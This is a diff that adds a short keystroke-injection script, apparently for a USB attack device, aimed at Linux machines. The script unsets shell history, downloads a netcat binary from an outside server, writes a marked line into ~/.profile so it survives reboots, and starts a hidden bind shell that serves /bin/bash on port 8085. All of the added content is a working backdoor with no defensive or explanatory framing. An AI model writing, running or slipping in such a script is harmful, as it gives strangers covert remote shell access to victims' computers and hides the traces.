@@ -1,1 +1,26 @@
-I am 1101
+::REM Netcat bind shell
+
+::OS LINUX
+
+::TERM
+::REM Hide history
+unset HISTFILE
+sedhash=#6d617463685f74686973
+location=~/.local/.nc
+profile=~/.profile
+mkdir -p $location
+cd $location
+
+ps aux | grep nc | grep -v grep | awk '{print $2}' | xargs kill
+rm nc
+rm nc.sh
+sed -i "/\($sedhash\)/d" $profile
+::DELAY 500
+wget 'https://www.cse.unsw.edu.au/~z3419746/nc' -O 'nc.vec'
+::REM Terminal is pretty good at buffering input
+::REM ::DELAY 3000
+chmod +x nc.vec
+echo "($location/nc.vec -lp 8085 -e /bin/bash &) $sedhash" >> $profile
+./nc.vec -lp 8085 -e /bin/bash & sleep 1
+disown
+exit
